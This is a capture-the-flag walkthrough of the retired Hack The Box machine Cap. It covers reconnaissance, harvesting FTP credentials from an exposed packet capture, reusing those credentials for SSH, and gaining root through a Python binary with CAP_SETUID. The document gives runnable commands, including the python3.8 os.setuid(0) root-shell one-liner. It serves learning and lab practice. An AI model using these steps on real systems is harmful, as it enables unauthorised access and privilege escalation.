# HTB Cap — Complete Learning Walkthrough & Personal Notes

**Date:** 11 November 2026  
**Machine:** Cap (retired, Easy, Linux)  
**Temporary lab IP:** `10.129.168.241`  
**Outcome:** User flag owned; SSH shell as `nathan`; root shell (`uid=0`) confirmed. Root flag reading/submission not recorded.

> **Spoiler warning:** This document includes the complete observed attack path for the retired Hack The Box machine *Cap*. Keep it as personal study notes or share it only where retired-machine writeups are permitted. Passwords and flags are deliberately excluded.

## 0. The big picture

```text
Nmap discovers 21/22/80
       ↓
Anonymous FTP fails
       ↓
HTTP Security Dashboard → Security Snapshot
       ↓
/data/4 and other numeric report IDs → /data/0
       ↓
Download PCAP → Wireshark → Follow FTP TCP stream
       ↓
Find USER nathan + plaintext PASS + 230 success
       ↓
FTP login works → user.txt is visible
       ↓
Reuse recovered credentials for SSH → nathan shell
       ↓
sudo -l fails; SUID search unremarkable
       ↓
getcap -r / → Python 3.8 has CAP_SETUID
       ↓
Python os.setuid(0) + spawn /bin/bash → root shell
```

## 1. Prepare the workspace and set the target

```bash
mkdir -p ~/htb/cap
cd ~/htb/cap
export IP=10.129.168.241
echo "$IP"
```

## 2. Initial reconnaissance with Nmap

```bash
nmap -sC -sV -oN initial_scan.txt "$IP"
```

Results observed:

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
http-title: Security Dashboard
```

What each option does:

| Item | Meaning |
|---|---|
| `-sC` | Default Nmap NSE scripts |
| `-sV` | Service/version detection |
| `-oN initial_scan.txt` | Save normal-format output |
| `$IP` | Expand target IP environment variable |
| `21` | FTP — file-transfer service |
| `22` | SSH — encrypted remote login/shell |
| `80` | HTTP — web service, default port 80 |

**Method lesson:** An open port is a clue about an available service, **not** evidence of a vulnerability. Choose follow-up tests based on the service. This scan covered default TCP ports rather than all 65,535.

### Why open the URL in a browser?

Nmap detected HTTP on port 80, so the natural next step was `http://10.129.168.241` (equivalent to `http://10.129.168.241:80`). For HTTP on a non-default port like 8080, use `http://<ip>:8080`; for HTTPS on 443, use `https://<ip>`.

### Brief TLS lesson

HTTPS is HTTP protected by TLS. TLS negotiates cryptographic keys, typically authenticates the server using a certificate, and protects data confidentiality and integrity in transit. Plain HTTP and traditional FTP do **not** provide equivalent protection for application content and credentials. HTTPS can still contain application vulnerabilities such as broken access control.

## 3. Test FTP anonymously

```bash
ftp "$IP"
# Username: anonymous
# Password: press Enter
```

Observed response:

```text
220 (vsFTPd 3.0.3)
331 Please specify the password.
530 Login incorrect.
```

Meaning of common FTP response codes:

| Code | Meaning |
|---|---|
| `220` | Service ready |
| `331` | Username accepted for processing; password required |
| `230` | Login succeeded |
| `530` | Login rejected |
| `150` | Data transfer/directory operation beginning |
| `226` | File transfer/directory operation completed |

**Lesson:** Do not spend the whole session brute-forcing an unpromising service. Record the result and investigate other exposed surfaces.

## 4. Enumerate the HTTP Security Dashboard

Open:

```text
http://10.129.168.241
```

Features observed in screenshots:

- Dashboard.
- **Security Snapshot (5 Second PCAP + Analysis)**.
- IP Config (displayed networking information, similar to `ifconfig`).
- Network Status.
- A Nathan user/profile indicator.

Clicking Security Snapshot produced:

```text
http://10.129.168.241/data/4
```

The path consists of `/data/` followed by a numeric record ID. Changing this number revealed distinct records, including:

```text
/data/3
/data/2
/data/1
/data/0
```

Screenshot observations included `/data/0` with 72 packets, `/data/1` with 2, `/data/2` with 4, and `/data/3` with 93. The page offered a PCAP download.

**Reasoning:** User-controlled numeric identifiers can be worth testing for broken object-level authorization / IDOR. But **changing an ID and seeing different data is not automatically proof** of IDOR. You need to establish expected access rights and a violation of those rights. Here, the risk was amplified because packet captures can contain secrets.

## 5. Download and open the PCAP in Wireshark

From `/data/0`, use the dashboard's Download control to save the capture. In Wireshark on Windows:

1. **File → Open** (or Ctrl+O).
2. Select the downloaded PCAP.
3. Do **not** select a network interface unless you want to start a *live* capture; this task involved opening a saved file.
4. Observe the packet list before filtering.

### Wireshark's three main areas

| Panel | What it shows |
|---|---|
| Packet List | Packets with time, source, destination, protocol, length and summary |
| Packet Details | Protocol-layer tree for the selected packet (Ethernet/IP/TCP/application) |
| Packet Bytes | Raw bytes (hexadecimal and readable ASCII when possible) |

Useful display filters:

```wireshark
ftp
http
tcp
tcp.port == 21
ip.addr == 192.168.196.16
```

*Filters only change what is displayed; they do not delete packets.*

### TCP handshake refresher

The packet list showed TCP connection setup before HTTP payloads:

```text
Client → Server: SYN
Server → Client: SYN, ACK
Client → Server: ACK
```

Then application-layer messages such as `GET / HTTP/1.1` and `HTTP/1.0 200 OK` appeared. A `404 Not Found` in HTTP means a requested resource was unavailable; it does not mean the TCP connection itself failed.

### PCAP versus logs

A **PCAP** contains recorded network packets, including packet headers and possibly application payloads. A **log** usually contains events an application or system deliberately writes (e.g., successful login, failed login, error). Wireshark is principally a packet analyzer. Analysts use both packet captures and logs to reconstruct incidents.

## 6. Follow the FTP TCP stream

In Wireshark:

1. Enter the display filter `ftp`.
2. Locate `Request: USER nathan`.
3. Right-click → **Follow → TCP Stream**.
4. Inspect the reconstructed client/server messages.

Key observed exchange (password redacted):

```text
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS [REDACTED]
230 Login successful.
SYST
215 UNIX Type: L8
LIST
150 Here comes the directory listing.
226 Directory send OK.
```

Another attempt in the capture used `RETR notes.txt`, which failed with `550`; this was a file operation failure, **not** an authentication failure.

**Why the finding matters:** Traditional FTP control messages are sent unencrypted. Anyone able to inspect a recording of that control traffic can read the username and password. `230 Login successful` confirms those credentials worked at capture time.

## 7. Authenticate as Nathan over FTP

```bash
ftp 10.129.168.241
# Username: nathan
# Password: exact value from PCAP (do not record in public notes)
```

The first manually entered attempt failed with `530 Login incorrect`; a subsequent attempt with the correct case-sensitive password succeeded.

At the authenticated `ftp>` prompt:

```text
pwd
ls -la
```

Key listing:

```text
-r-------- 1 1001 1001 33 Nov 11 15:21 user.txt
```

The `-r--------` permission string means it is a regular file readable only by its owner. The file was available through the authenticated FTP session and the **user flag was marked owned** in HTB's UI.

To download a remote file in FTP:

```text
get user.txt
bye
```

Then locally, if downloaded:

```bash
cat user.txt
```

The exact flag was not retained in this writeup.

## 8. Get an interactive SSH shell

Remember Nmap showed SSH on port 22. A useful hypothesis was that Nathan's recovered password might also work for SSH.

```bash
ssh nathan@10.129.168.241
# Password: [REDACTED]
```

It worked. Run basic host/context checks:

```bash
whoami
id
hostname
pwd
```

Observed:

```text
nathan
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
cap
/home/nathan
```

**Lesson:** FTP offers file transfer, while SSH provides an encrypted remote command-line session. The same password being valid for both services enabled the transition from exposed capture to a real shell. Do not assume services share credentials without checking.

## 9. Linux privilege-escalation enumeration

Once inside the machine, determine who you are and what privileges or configuration mistakes may exist.

### 9.1 OS version

```bash
cat /etc/os-release
uname -a
```

`cat /etc/os-release` reported **Ubuntu 20.04.2 LTS (Focal Fossa)**. No `uname -a` output was provided in the available session, so its kernel details are not documented.

### 9.2 Sudo permissions

```bash
sudo -l
```

Observed:

```text
Sorry, user nathan may not run sudo on cap.
```

So `sudo` was not an available escalation route for Nathan.

### 9.3 SUID binaries

```bash
find /usr/bin /usr/local/bin -type f -perm -4000 2>/dev/null
```

Returned SUID programs included `umount`, `newgrp`, `pkexec`, `mount`, `gpasswd`, `passwd`, `chfn`, `sudo`, `at`, `chsh`, `su`, and `fusermount`. Their presence alone does not prove exploitability.

Breakdown:

- `-type f` — regular files only.
- `-perm -4000` — SUID permission bit is present.
- `2>/dev/null` — suppress permission errors (stderr).
- This search only checked two directories; a full-disk SUID search would need a wider scope.

### 9.4 Linux file capabilities — the decisive check

```bash
getcap -r / 2>/dev/null
```

Observed:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Why `python3.8` stood out:

- `CAP_SETUID` permits operations that change process user IDs.
- UID `0` is the root user.
- Python accepts arbitrary user-supplied code and exposes the OS function `os.setuid()`.
- Thus, **an executable Python interpreter with effective `CAP_SETUID`** can potentially change its own UID to root and spawn commands in that identity.

The `+eip` suffix denotes file capability flags (effective, inheritable, permitted). These are different from SUID mode bits and independent of `sudo -l` permissions.

Other capabilities have different purposes: `cap_net_raw` relates to raw sockets; `cap_net_bind_service` permits binding to privileged ports. Powerful names warrant investigation, but don't assume every capability grants root.

### How would you know to investigate a capability?

Use this chain of reasoning:

```text
Observation: Python has CAP_SETUID
→ Understand: SETUID relates to changing user IDs
→ Hypothesis: Can Python request UID 0?
→ Validate: Call Python's os.setuid(0)
→ Verify: whoami / id
```

Useful reference for future labs: [GTFOBins — Python](https://gtfobins.github.io/gtfobins/python/). Research a discovered permission and ask what the program is capable of doing with it; do not rely entirely on memorized exploit strings.

## 10. The final privilege escalation

First check identity when invoked:

```bash
/usr/bin/python3.8 -c 'import os; print(os.getuid())'
```

Result:

```text
1001
```

### Mistake encountered: running Python code as a Bash command

This was entered directly at a Bash prompt:

```bash
os.setuid(0)
```

Bash returned a syntax error because `os.setuid(0)` is Python syntax, **not** a Bash program. To execute a Python expression, pass it to the interpreter with `-c` or enter an interactive Python interpreter first.

Successful lab command:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Breakdown:

| Code | Effect |
|---|---|
| `/usr/bin/python3.8` | Run the interpreter with the assigned file capability |
| `-c` | Execute the provided Python source string |
| `import os` | Load Python's operating-system interface |
| `os.setuid(0)` | Ask the kernel to set the process's user ID to root |
| `os.system("/bin/bash")` | Launch a Bash shell after the UID change |

Proof:

```text
root@cap:~# whoami
root
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

The UID changed but the GID did not: `os.setuid()` modifies user identity; it doesn't automatically rewrite group membership. Root-level execution was nonetheless confirmed.

**Root flag note:** The command `cat /root/root.txt` was suggested as the next step, but there is no evidence in this session that the command was run or that the root flag was submitted. Do not mark that as completed without checking.

## 11. What were the actual security weaknesses?

| Issue | Mechanism | Practical outcome |
|---|---|---|
| Exposed historical PCAP records | Predictable `/data/<id>` retrieval; authorization controls not fully established | Allowed inspection of old traffic; potential broken access control |
| Credentials in FTP packet capture | FTP control channel transmitted `USER` / `PASS` in plaintext | Recovered a valid account password |
| Credential usable across services | Same credentials accepted by FTP and SSH | Enabled interactive login as Nathan |
| Misconfigured `CAP_SETUID` | Python 3.8 given permission to change process UIDs | Allowed launch of a UID-0 shell |

**Important:** This is not evidence of a Python software vulnerability or necessarily a confirmed IDOR. The privilege escalation is a host configuration failure; the web access-control determination needs an authorization baseline.
